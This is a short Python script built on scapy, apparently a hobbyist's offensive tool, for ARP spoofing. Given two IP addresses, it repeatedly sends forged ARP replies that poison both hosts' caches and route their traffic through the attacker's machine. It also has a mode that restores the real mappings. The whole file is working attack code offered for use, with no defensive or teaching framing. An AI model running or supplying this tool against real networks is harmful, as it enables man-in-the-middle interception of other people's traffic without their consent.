
#[+]installation module
#[+]developer:-shreyas zadge
#[+]script_version:-1.0
from os import name
import scapy.all as scapy 
import argparse
import time
#geting variable values from outside 
def arg_parser():
    parser=argparse.ArgumentParser()
    parser.add_argument('integer',nargs='+',type=str,help="Ip address1 Ip address2 ")
    parser.add_argument("-i",type=int,dest="options",required=True,help="put the value \n 1)arpspoof=>0 \n 2)arprestore=>999")
    arg=parser.parse_args()
    return arg
#provide mac address for device 
def mac_provider(ip):
    arp_request=scapy.ARP(pdst=ip)
    boadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_boardcast=boadcast/arp_request
    ans_list=scapy.srp(arp_request_boardcast,verbose=False,timeout=1)[0]
    return ans_list[0][1].hwsrc
#arp spoofer script    
def mac_spoofer(IP1,IP2):
    mac_adre1=mac_provider(IP1)
    mac_adre2=mac_provider(IP2)
    packet1=scapy.ARP(op=2,pdst=IP1,hwdst=mac_adre1,psrc=IP2)
    packet2=scapy.ARP(op=2,pdst=IP2,hwdst=mac_adre2,psrc=IP1)
    scapy.send(packet1,verbose=False)
    scapy.send(packet2,verbose=False)
#arp restore script     
def mac_restore(IP1,IP2):
    mac_adre1=mac_provider(IP1)
    mac_adre2=mac_provider(IP2)
    packet1=scapy.ARP(op=2,pdst=IP1,hwdst=mac_adre1,psrc=IP2,hwsrc=mac_adre2)
    packet2=scapy.ARP(op=2,pdst=IP2,hwdst=mac_adre2,psrc=IP1,hwsrc=mac_adre1)
    scapy.send(packet1,verbose=False)
    scapy.send(packet2,verbose=False)
#main script start here
if __name__=="__main__":
    optp = arg_parser()
    ip1_scan=optp.integer[0]
    ip2_scan=optp.integer[1]
    options_selected=optp.options
    if options_selected ==0:
        send_packet_count=0
        try:
            while True:
                mac_spoofer(ip1_scan,ip2_scan)
                time.sleep(2)
                print(f"\r [+]packet sent{send_packet_count}",end=" ")
                send_packet_count=send_packet_count+2

        except KeyboardInterrupt:
            print("[+] ctrl + c prees program is stop")
   
    if options_selected==999:
        try:
            mac_restore(ip1_scan,ip2_scan)
            print("[+]arp spoofing restore ")
        except:
            print("[+]something went wrong please restart program")    
    else:
        print("[-][-]operations Out Of Range")